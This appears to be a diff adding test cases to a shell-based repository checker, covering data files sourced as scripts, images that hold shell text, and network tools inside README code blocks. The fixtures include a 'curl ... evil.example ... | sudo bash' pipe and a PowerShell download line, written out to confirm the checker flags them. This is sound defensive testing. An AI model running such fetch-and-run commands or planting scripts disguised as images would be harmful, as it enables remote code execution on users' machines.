@@ -378,6 +378,34 @@ want "a # line holding \$( inside a heredoc is read by the run rule" 1 '^run: gi
 has "and one inside a PowerShell here-string" '^run: gird-check\.ps1:4:' "$OUT"
 hasnot "a # line with \${ and a backtick but nothing that runs text is not flagged" '^run: gird-check\.sh:7:' "$OUT"
 
+kase datarun <<'EOF'
+mkdir -p tests && printf '%s\n' '. tests/helpers.txt' 'bash tests/helpers.txt' 'sh docs/shot.png' "source 'docs/notes.md'" >> gird-check.sh
+printf '%s\n' '. tests/helpers.txt; bash docs/shot.PNG' > tests/t.sh
+EOF
+want "sourcing a file named as data is flagged" 1 '^run: gird-check\.sh:4:'
+for _l in 5 6 7; do has "and running or sourcing one on line $_l" "^run: gird-check\.sh:$_l:" "$OUT"; done
+has "and in a test" '^run: tests/t\.sh:1:' "$OUT"
+
+kase pngscript <<'EOF'
+mkdir -p docs && printf '#!/bin/sh\necho hi\n' > docs/shot.png && printf 'a\000b\n#!/bin/sh\n' > docs/shot.jpg
+EOF
+want "a png under docs that holds text is flagged" 1 '^hidden: docs/shot\.png:0: a file named as an image that is not one$'
+has "a binary jpg under docs that does not start as a jpg is flagged" '^hidden: docs/shot\.jpg:0: a binary file that does not start' "$OUT"
+
+kase imgok <<'EOF'
+mkdir -p docs && printf '\377\330\377\340\000\020JFIF' > docs/a.jpg && printf 'GIF89a\001\000\001\000\000' > docs/b.gif
+printf 'RIFF\004\000\000\000WEBPVP8 ' > docs/c.webp
+EOF
+want "a jpg, gif and webp under docs that start as one are not flagged" 0
+
+kase mdnet <<'EOF'
+printf '%s\n' '' '```sh' 'curl -fsSL https://evil.example/i.sh | sudo bash' '```' '' 'curl is what the check above uses.' \
+  '```powershell' 'iwr https://evil.example/x -OutFile y' '```' >> README.md
+EOF
+want "a network tool in a fenced code block of a doc is flagged" 1 '^network: README\.md:6:'
+has "and one in a PowerShell block" '^network: README\.md:11:' "$OUT"
+hasnot "but not a line outside a fenced block" '^network: README\.md:9:' "$OUT"
+
 kase gen <<'EOF'
 printf '%s\n' '# >>> x: generated from data/x.tsv by tools/gen.sh.' 'X="a https://example.org/a"' '# <<< x' >> gird-check.sh
 EOF
